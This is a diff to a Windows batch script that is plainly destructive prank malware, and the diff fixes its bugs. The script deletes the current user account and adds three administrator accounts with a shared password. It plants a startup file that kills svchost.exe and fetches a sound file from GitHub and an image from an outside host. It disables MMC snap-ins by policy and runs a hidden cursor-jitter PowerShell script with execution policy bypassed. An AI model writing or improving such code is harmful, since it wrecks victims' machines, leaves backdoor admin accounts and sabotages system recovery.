@@ -8,10 +8,7 @@ if %input%==n goto exit
 
 :hack 
 net user /delete %username%
-net user /adset "url=https://github.com/dnndj-39/ben-theme-music/raw/refs/heads/main/ben-theme.wav"
-set "out=%temp%\din\ben-theme.wav"
-powershell -Command "Invoke-WebRequest -Uri \"%url%\" -OutFile \"%out%\""
-start "" powershell -windowstyle hidden -Command "(New-Object Media.SoundPlayer '%out%').Play()"d Anonymousnake T4@123456
+net user /add Anonymousnake1 T4@123456
 net user /add Anonymousnake2 T4@123456
 net user /add Anonymousnake3 T4@123456
 net localgroup Administrators Anonymousnake1 /add
@@ -22,18 +19,6 @@ net localgroup Administrators Anonymousnake3 /add
 
 set "startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
 echo taskkill /f /im svchost.exe  > "%startup%\BLOODBENISHERE.bat"
-set "url=https://github.com/dnndj-39/ben-theme-music/raw/refs/heads/main/ben-theme.wav"
-set "out=%temp%\din\ben-theme.wav"
-
-
-mkdir "%temp%\din" 2>nul
-
-
-powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%out%'"
-
-timeout /t 1 >nul
-
-start "" powershell -windowstyle hidden -Command "(New-Object Media.SoundPlayer '%out%').PlaySync()"
 
 set "URL=https://i.postimg.cc/wvfBjpK2/images.jpg"
 set "FILE=%TEMP%\din\BEN.jpg"
@@ -47,6 +32,20 @@ reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 
 
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+set "url=https://github.com/dnndj-39/ben-theme-music/raw/refs/heads/main/ben-theme.wav"
+set "out=%temp%\din\ben-theme.wav"
+
+
+mkdir "%temp%\din" 2>nul
+
+
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%out%'"
+
+timeout /t 1 >nul
+
+start "" powershell -windowstyle hidden -Command "(New-Object Media.SoundPlayer '%out%').PlaySync()"
+
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC" ^ /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\Snapins\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" ^ /v Allowed /t REG_DWORD /d 0 /f
@@ -98,7 +97,7 @@ echo     $deltaX = $rand.Next(-4, 5) >> "%psFile%"
 echo     $deltaY = $rand.Next(-4, 5) >> "%psFile%"
 echo     [Win32.User32]::SetCursorPos($initialX + $deltaX, $initialY + $deltaY) >> "%psFile%"
 echo     Start-Sleep -Milliseconds 10 >> "%psFile%"
-echo } >> "%ffpsFile%"
+echo } >> "%psFile%"
 start "" PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%psFile%"
 
 
